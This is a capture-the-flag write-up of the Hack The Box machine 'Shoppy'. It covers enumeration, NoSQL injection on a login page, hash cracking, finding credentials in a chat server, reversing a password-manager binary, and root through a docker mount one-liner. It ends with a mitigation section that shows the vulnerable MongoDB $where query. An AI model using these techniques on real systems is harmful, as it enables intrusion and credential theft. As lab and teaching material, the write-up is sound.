I had a hard time getting my initial access to this box. It required playing with Mongo Injection. And multiple enumerations of subdomains. Once on the box, getting root was quick. A reversing of a simple application and running Docker.

* Room: Shoppy
* Difficulty: Easy
* URL: [https://app.hackthebox.com/machines/Shoppy](https://app.hackthebox.com/machines/Shoppy)
* Author: [lockscan](https://app.hackthebox.com/users/217870)

## Enumeration

As always, I started the box by running rustscan to find open ports.

```bash
$ rustscan -a target -- -v | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

There were 3 open ports:
* 22 (SSH)
* 80 (HTTP)
* 9093 (?)

I checked what was on port 9093. I tried connecting to it with netcat, it had a web server on it.

```bash
$ nc target 9093

```

I opened it in a browser and got some kind of garbage collector logs.

![Logs](/assets/images/Shoppy/LogsSite.png "Logs")

I also scanned for UDP ports. None were open.

```bash
$ sudo nmap -sU target -oN nampUdp.txt

## Main Site

I opened a browser to port 80 and I was redirected to `http://shoppy.htb`. I added that to my hosts files and reloaded the site.

![Main Site](/assets/images/Shoppy/MainSite.png "Main site")

It was a simple page with a countdown for the launch of the site.

I launched feroxbuster to scan for hidden pages.

```bash
$ feroxbuster -u http://shoppy.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -o ferox.txt

There was a login page on the site.

![Login](/assets/images/Shoppy/ShoppyLogin.png "Login")

I started experimenting with the login page. The form post was sending URL encoded data, but I found out I could send JSON.

I tried SQL Injection and NoSQL Injection. The site seemed to crash when sending a single `'`. After trying lots of different payloads I found, I finally got one that worked.

I tried the same thing in my browser and I got the admin page.

![Admin](/assets/images/Shoppy/Admin.png "Admin")

The site had a static product list. But it also allowed searching for users. I use the same injection than the login page. This gave me a button to download the results.

![Search Results](/assets/images/Shoppy/SearchResult.png "Search Results")

I downloaded them, it gave me a JSON of the users.

```json
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"

    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```

The JSON contained two hashes, so I used hashcat to crack them.

```bash
$ hashcat -a0 -m0 hash.txt /usr/share/seclists/rockyou.txt

It cracked the password for josh. I tried those credentials in SSH, but it failed. 

At this point, I got stuck for a long time. I had checked for subdomains already and did not find any. Eventually, I checked the Hack The Box forum for a hint. Someone mentioned using different lists. So I tried again with other lists. One of them found something.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -t30 --hw 11 -H "Host:FUZZ.shoppy.htb" "http://shoppy.htb/"

I added `mattermost.shoppy.htb` to my host file. And loaded the site. It gave me a login page.

![Mattermost](/assets/images/Shoppy/MattermostLogin.png "Mattermost")

I tried josh's credentials and I was in the chat application. I looked around the channels and found one that contained credentials.

![Chat](/assets/images/Shoppy/CredsInChat.png "Chat")

I used those credentials in SSH and I was in.

```bash
$ ssh jaeger@target
jaeger@target's password:
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;

jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos

jaeger@shoppy:~$ cat user.txt
REDACTED
```

## Lateral Movement

Once I had a connection, I looked at what the user could do.

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger:
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

I could execute a password manager as the user deploy.


```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!     
Please enter your master password: REDACTED
Access denied! This incident will be reported !
```

I ran the program, it required a password. I tried jaeger's password but it did not work.

I looked for strings in the binary. 

```bash
jaeger@shoppy:~$ strings /home/deploy/password-manager
/lib64/ld-linux-x86-64.so.2
__gmon_start__
_ITM_deregisterTMCloneTable                    
...
Welcome to Josh password manager!
Please enter your master password: 
Access granted! Here is creds !
cat /home/deploy/creds.txt
Access denied! This incident will be reported !
...
```

I tried reading `/home/deploy/creds.txt` but I was not allowed. 

I used `scp` to get the executable locally and used Ghidra to reverse it. I quickly found the code that checked for the password.

![Ghidra](/assets/images/Shoppy/Ghidra.png "Ghidra")

I used the password I found in the code and I was able to `su` as deploy.

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: REDACTED
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: REDACTED

jaeger@shoppy:~$ su deploy
Password:
$
```

## Getting root

Once logged in as deploy, I looked for ways to get root. The user was not allowed to run anything with `sudo` and I did not find any suspicious suid binary.

But the user was part of the docker group. So they could run `docker`.

```bash
deploy@shoppy:/home/jaeger$ groups
deploy docker

I knew I could easily get root access with docker. I when to [GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) for the command to mount `/` in a container.


```bash
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ls /root
root.txt

# cat /root/root.txt
REDACTED
```

## Mitigation

The first issue with this box was with the Mongo Injection. The code was using user input to build a string that it passed to `$where`.

 ```js
const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
```

It would have been safer to build the query without using `$where`. But this would still require that the data was validated to make sure only strings where used.

```js
const query = { username: `${username}`,  password: `${passToTest}` };
```

Next, the way passwords are used on the box is bad. Josh's password is reused between the main application and the chat server. Jaegear's credentials are sent over chat. And deploy's credentials are easy to get.

Finally, permissions to run `docker` should be restricted. On this box, deploy was allowed to do it, and their credentials were easy to get. That made getting root very easy.
